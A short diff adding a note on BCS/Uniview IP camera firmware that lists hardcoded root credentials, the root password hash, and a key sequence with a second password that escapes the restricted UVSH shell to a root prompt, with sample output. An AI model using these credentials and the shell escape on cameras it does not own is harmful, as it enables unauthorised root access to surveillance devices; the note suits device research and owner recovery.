@@ -1,0 +1,17 @@
+BCS Firmware: IPC_E5101-B5012P07D1603C10
+Enable telnet via web interface.
+Login: root
+pass: arts18
+
+Original hash:
+root:ewqm1M.0UCGAM:0:0:root:/root:/usr/bin/uvsh
+
+Exit closed UVSH shell:
+type: uniview + alt + 1 and alt +2 (uniview12)
+It will ask for password: QdCpBsjP_R301
+
+User@/root>uniview
+ Please input password:
+root@root:~$ whomai
+root
+
